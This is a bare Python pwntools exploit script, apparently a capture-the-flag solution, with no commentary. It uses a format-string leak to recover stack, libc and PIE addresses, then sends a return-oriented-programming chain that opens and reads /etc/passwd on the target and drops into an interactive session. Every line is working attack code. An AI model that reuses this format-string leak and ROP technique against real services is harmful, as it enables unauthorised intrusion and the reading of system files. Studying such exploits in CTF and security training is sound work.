from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
s.recvuntil('Give me input:')
magic = "%2llx"+"AA%3$lx"
dat = magic+"A"*(0x3f7-len(magic))
dat += "V"
dat += p16(0x1ce5)

s.sendline(dat)
stack = int(s.recvuntil('AA')[:-2],16)
print "STACK : ",hex(stack)

libc = int(s.recvuntil('AA')[:-2],16) - 0xf7260
print "LIBC : ",hex(libc)

s.recvuntil('V')
pie = u64(s.recv(6)+'\x00\x00') - 0xce5
print "PIE : ",hex(pie)
dat = "A"*0x3f8
dat += p64(pie+0x0CEE)
s.send(dat)
gadget1 = 0x0000000000000da3 # pop rdi ; ret
gadget2 = 0x0000000000000da1 # pop rsi ; pop r15 ; ret
raw_input('d')
dat = p64(stack+0x1d+0x8-0x3F8)
dat += p64(pie+0x000D32)
dat += p64(gadget1+pie)
dat += p64(stack+0x1d+0x200)
dat += p64(gadget2+pie)
dat += p64(0)
dat += p64(0xdeadbeef)
dat += p64(libc+0xf7030)
dat += p64(gadget1+pie)
dat += p64(5)
dat += p64(gadget2+pie)
dat += p64(stack+0x1d+0x500)
dat += p64(0x0)
dat += p64(libc+0x1b92)
dat += p64(0x100)
dat += p64(pie+0x0980)
dat += p64(gadget1+pie)
dat += p64(stack+0x1d+0x500)
dat += p64(pie+0x00920 )
dat += "A"*(0x200-len(dat))
dat += "/etc/passwd\x00"
dat += "A"*(0x400-len(dat))
s.send(dat)
s.interactive()
